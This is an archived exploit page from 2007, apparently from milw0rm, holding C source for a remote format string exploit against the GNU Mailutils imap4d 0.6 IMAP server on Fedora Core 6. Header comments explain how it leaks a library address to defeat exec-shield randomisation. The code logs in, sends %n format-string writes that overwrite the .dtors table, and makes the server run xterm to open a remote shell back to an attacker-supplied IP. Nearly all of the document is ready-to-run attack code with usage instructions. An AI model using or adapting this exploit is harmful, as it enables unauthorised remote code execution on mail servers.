<html><head><title>GNU Mailutils imap4d 0.6 Remote Format String Exploit (exec-shield)</title></head><pre>/*
**
** Fedora Core 6 (exec-shield) based
** GNU imap4d mailutils-0.6 search remote format string exploit
** by Xpl017Elz
**
** Advanced exploitation in exec-shield (Fedora Core case study)
** URL: http://x82.inetcop.org/h0me/papers/FC_exploit/FC_exploit.txt
**
** Reference: http://www.securityfocus.com/bid/14794 (2005/09/09)
** http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=303
**
** --
** exploit by &quot;you dong-hun&quot;(Xpl017Elz), &lt;szoahc@hotmail.com&gt;.
** My World: http://x82.inetcop.org
**
*/
/*
** -=-= POINT! POINT! POINT! POINT! POINT! =-=-
**
** This vulnerability is one of the normal exploitation case under exec-shield.
** GNU imap4d can be run as a standalone deamon by using -d option and it inherits 
** virtual address of parent process which mapped randomly.
**
** [root@localhost .libs]# ps -ef | grep imap4d | grep -v grep
** root      8312     1  0 20:01 ?        00:00:00 ./lt-imap4d -d
** [root@localhost .libs]#
**
** These are keys to get over some possible problems.
**
** * `One shot' exploit without brute-forcing.
**
** Sometimes you man need to do some brute-forcing to assume the library address 
** which is mapped randomly. But this is not my recommendation.
**
** Because it is a format string attack, we can possibly get the ramdom address
** of the library. Using this technique, I could find exploitable do_system()
** address at once. but, unfortunately, it is not applicable to blind format string
** exploit by syslog().
**
** * How to execute a remote shell.
**
** I decided to use xterm for this, but if sadly, there is no xterm on the target
** server then you should look for another way. because of the variableness
** of size of IP address, I felt a need for fitting the address within 10 bytes. 
**
** Hacker's IP address would be a perfect demical numbers and it makes size
** of IP address same and shortens the string to overwrite. 
**
** xterm exploit code includes do_system() address can be writen in 136 bytes
** of general exploit code.
**
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;

#define DEF_STR &quot;x0x&quot;
#define PORT 143

#define DF_SFLAG 11
#define DF_OFFSET 29
#define DTOR_END_ADDR 0x08059268
#define DO_SYSTEM 0x828282
#define SHELL 0x3b6873
#define DEF_DO_SYSTEM_OFFSET 0x1fbf9
#define GET_DO_SYSTEM_SFLAG 38

#define XHOST_IP &quot;82.82.82.82&quot;

void banrl();
void usage();
void re_connt(int sock);
int setsock(char *host,int port);


long xterm_shell[]={ // do_system(&quot;xterm -di ip_addr&quot;);
	0x7478,0x7265,
	0x206d,0x642d,
	0x2069,0x4141, /* IP address */
	0x4141,0x4141,
	0x4141,0x4141,
	0x303a,0x0000
};
int xterm_ip_count=5;


int get_10_ip(char *ipbuf){
	char tbuf[32];
	int i=0;
	unsigned long ip,ip1,ip2,ip3,ip4;
	ip=ip1=ip2=ip3=ip4;

	sscanf(ipbuf,&quot;%d.%d.%d.%d&quot;,&amp;ip1,&amp;ip2,&amp;ip3,&amp;ip4);
#define IP1 16777216
#define IP2 65536
#define IP3 256
	ip=0;
	ip+=ip1 * (IP1);
	ip+=ip2 * (IP2);
	ip+=ip3 * (IP3);
	ip+=ip4;

	memset((char *)ipbuf,0,256);
	sprintf(ipbuf,&quot;%lu&quot;,ip);
	xterm_ip_count=5;

	for(i=0;i&lt;10;i+=2){
		memset((char *)tbuf,0,sizeof(tbuf));
		snprintf(tbuf,sizeof(tbuf)-1,&quot;0x%02x%02x&quot;,ipbuf[i+1],ipbuf[i]);

		ip=strtoul(tbuf,NULL,0);
		xterm_shell[xterm_ip_count++]=ip;
	}
	return 0;
}

int send_exploit_code(int sock,unsigned long retloc,unsigned long retaddr,int sflag){
	char buf[1024];
	int i=0;

	memset((char *)buf,0,sizeof(buf));
	snprintf(buf,sizeof(buf)-1,&quot;1 search topic x&quot;);
	i=strlen(buf);
	*(long *)&amp;buf[i]=retloc;
	i+=4;
	if(retaddr==0){
		retaddr+=0x10000;
	}
	sprintf(buf+i,&quot;%%%lux%%%d$n\n&quot;,retaddr-i-DF_OFFSET,sflag);

	send(sock,buf,strlen(buf),0);
	memset(buf,0,sizeof(buf));
	while(recv(sock,buf,sizeof(buf)-1,0)){
		if(strstr(buf,&quot;)&quot;)){
			break;
		}
	}
	return 0;
}

int main(int argc,char *argv[]){
	int sflag=DF_SFLAG;
	unsigned long do_system_addr=DO_SYSTEM;
	unsigned long retloc=DTOR_END_ADDR;
	unsigned long shaddr=SHELL;
	char host[256]=DEF_STR;
	int port=PORT;
	extern char *optarg;
	int sock,i,r=0;
	char buf[1024];
	char user[256]=DEF_STR;
	char pass[256]=DEF_STR;
	char *ptr=NULL;
	char xhost_ip_buf[256]=XHOST_IP;

	get_10_ip(xhost_ip_buf);

	memset((char *)buf,0,sizeof(buf));
	memset((char *)user,0,sizeof(user));
	memset((char *)pass,0,sizeof(pass));

	(void)banrl();
	while((sock=getopt(argc,argv,&quot;R:r:D:d:H:h:P:p:F:f:I:i:U:u:S:s:&quot;))!=EOF){
		switch(sock){
			case 'R':
			case 'r':
				retloc=strtoul(optarg,NULL,0);
				break;
			case 'D':
			case 'd':
				do_system_addr=strtoul(optarg,NULL,0);
				break;
			case 'H':
			case 'h':
				memset((char *)host,0,sizeof(host));
				strncpy(host,optarg,sizeof(host)-1);
				break;
			case 'P':
			case 'p':
				port=atoi(optarg);
				break;
			case 'F':
			case 'f':
				sflag=atoi(optarg);
				break;
			case 'I':
			case 'i':
				memset((char *)xhost_ip_buf,0,sizeof(xhost_ip_buf));
				strncpy(xhost_ip_buf,optarg,sizeof(xhost_ip_buf)-1);
				get_10_ip(xhost_ip_buf);
				break;
			case 'U':
			case 'u':
				memset((char *)user,0,sizeof(user));
				strncpy(user,optarg,sizeof(user)-1);
				break;
			case 'S':
			case 's':
				memset((char *)pass,0,sizeof(pass));
				strncpy(pass,optarg,sizeof(pass)-1);
				break;
			case '?':
			default:
				(void)usage(argv[0]);
				break;
		}
	}
	if(!strcmp(host,DEF_STR)||!strcmp(user,DEF_STR)||!strcmp(pass,DEF_STR)){
		(void)usage(argv[0]);
	}

	fprintf(stdout,&quot; [+] make socket.\n&quot;);
	fprintf(stdout,&quot; [+] host: %s.\n&quot;,host);
	fprintf(stdout,&quot; [+] port: %d.\n&quot;,port);
	sock=setsock(host,port);
	re_connt(sock);

	recv(sock,buf,sizeof(buf)-1,0);
	if(strstr(buf,&quot;IMAP4rev1&quot;)){
		fprintf(stdout,&quot; [+] OK, IMAP4rev1.\n&quot;);
	}
	else {
		fprintf(stdout,&quot; [-] Ooops, no match.\n\n&quot;);
		close(sock);
		exit(-1);
	}

	memset((char *)buf,0,sizeof(buf));
	snprintf(buf,sizeof(buf)-1,&quot;1 login \&quot;%s\&quot; \&quot;%s\&quot;\n&quot;,user,pass);
	send(sock,buf,strlen(buf),0);
	memset((char *)buf,0,sizeof(buf));
	while(recv(sock,buf,sizeof(buf)-1,0)){
		if(strstr(buf,&quot; Completed&quot;)){
			fprintf(stdout,&quot; [+] login completed.\n&quot;);
			break;
		}
		else if(strstr(buf,&quot; rejected&quot;)){
			fprintf(stdout,&quot; [-] login failed.\n\n&quot;);
			exit(-1);
		}
	}

	memset((char *)buf,0,sizeof(buf));
	snprintf(buf,sizeof(buf)-1,&quot;1 select \&quot;inbox\&quot;\n&quot;);
	send(sock,buf,strlen(buf),0);
	memset((char *)buf,0,sizeof(buf));
	while(recv(sock,buf,sizeof(buf)-1,0)){
		if(strstr(buf,&quot; Completed&quot;)){
			fprintf(stdout,&quot; [+] select success.\n&quot;);
			break;
		}
		else if(strstr(buf,&quot; NO SELECT&quot;)){
			fprintf(stdout,&quot; [-] select failed.\n\n&quot;);
			exit(-1);
		}
	}


	/* get, do_system address */
	fprintf(stdout,&quot; [+] find do_system address.\n&quot;);
	memset((char *)buf,0,sizeof(buf));
	snprintf(buf,sizeof(buf)-1,&quot;1 search topic |%%%d$x|\n&quot;,GET_DO_SYSTEM_SFLAG);
	send(sock,buf,strlen(buf),0);
	memset((char *)buf,0,sizeof(buf));
	recv(sock,buf,sizeof(buf)-1,0);
	if(strstr(buf,&quot;|&quot;)){
		ptr=(char *)strstr(buf,&quot;|&quot;);
		sscanf(ptr,&quot;|%x|\n&quot;,&amp;do_system_addr);
	}
	do_system_addr-=DEF_DO_SYSTEM_OFFSET;

	fprintf(stdout,&quot; [+] make exploit code.\n&quot;);
	fprintf(stdout,&quot; [+] retloc address: %p.\n&quot;,retloc);
	fprintf(stdout,&quot; [+] do_system address: %p.\n&quot;,do_system_addr);
	fprintf(stdout,&quot; [+] send exploit code.\n&quot;);

	send_exploit_code(sock,retloc,do_system_addr,sflag);
	for(i=0,r=4;i&lt;(sizeof(xterm_shell)/4);i++,r+=2){
		send_exploit_code(sock,retloc+r,xterm_shell[i],sflag);
	}


#define LOGOUT_CMD &quot;1 logout\n&quot;
	send(sock,LOGOUT_CMD,strlen(LOGOUT_CMD),0);
	sleep(1);

	recv(sock,buf,sizeof(buf)-1,0);
	close(sock);

	if(strstr(buf,&quot;BYE&quot;)&amp;&amp;strstr(buf,&quot;LOGOUT&quot;)){
		fprintf(stdout,&quot; [+] logout success.\n\n&quot;);
	}
	else {
		fprintf(stdout,&quot; [-] logout failed.\n\n&quot;);
		exit(-1);
	}
	exit(0);
}

void banrl(){
	fprintf(stdout,&quot;\n FC6 (exec-shield) based GNU imap4d mailutils-0.6 search remote exploit\n&quot;);
	fprintf(stdout,&quot; by Xpl017Elz\n\n&quot;);
}

void usage(char *arg0){
	fprintf(stdout,&quot; Usage: %s -options arguments\n\n&quot;,arg0);

	fprintf(stdout,&quot;\t-r [retloc]    - .dtors address (default: %p).\n&quot;,DTOR_END_ADDR);
	fprintf(stdout,&quot;\t-d [do_system] - do_system address (auto).\n&quot;);
	fprintf(stdout,&quot;\t-h [host]      - target hostname or ip.\n&quot;);
	fprintf(stdout,&quot;\t-p [port]      - target port number (auto).\n&quot;);
	fprintf(stdout,&quot;\t-f [sflag]     - $-flag number (default: 11).\n&quot;);
	fprintf(stdout,&quot;\t-i [ip]        - attacker xhost ip.\n&quot;);
	fprintf(stdout,&quot;\t-u [user]      - imap user id.\n&quot;);
	fprintf(stdout,&quot;\t-s [pass]      - imap user pass.\n&quot;);
	fprintf(stdout,&quot;\t-?             - help information.\n\n&quot;);

	fprintf(stdout,&quot; Example: %s -hhost -iattacker -ux82 -spass\n\n&quot;,arg0);
	exit(-1);
}


void re_connt(int sock){
	if(sock==-1)
	{
		fprintf(stdout,&quot; [-] Failed.\n\n&quot;);
		exit(-1);
	}
}
 
int setsock(char *host,int port)
{
	int sock;
	struct hostent *he;
	struct sockaddr_in x82_addr;
 
	if((he=gethostbyname(host))==NULL)
	{
		return(-1);
	}

	if((sock=socket(AF_INET,SOCK_STREAM,0))==EOF)
	{
		return(-1);
	}
    
	x82_addr.sin_family=AF_INET;
	x82_addr.sin_port=htons(port);
	x82_addr.sin_addr=*((struct in_addr *)he-&gt;h_addr);
	bzero(&amp;(x82_addr.sin_zero),8);
 
	if(connect(sock,(struct sockaddr *)&amp;x82_addr,sizeof(struct sockaddr))==EOF)
	{
		return(-1);
	}
	return(sock);
}

/* eoc */

// milw0rm.com [2007-04-24]</pre></html>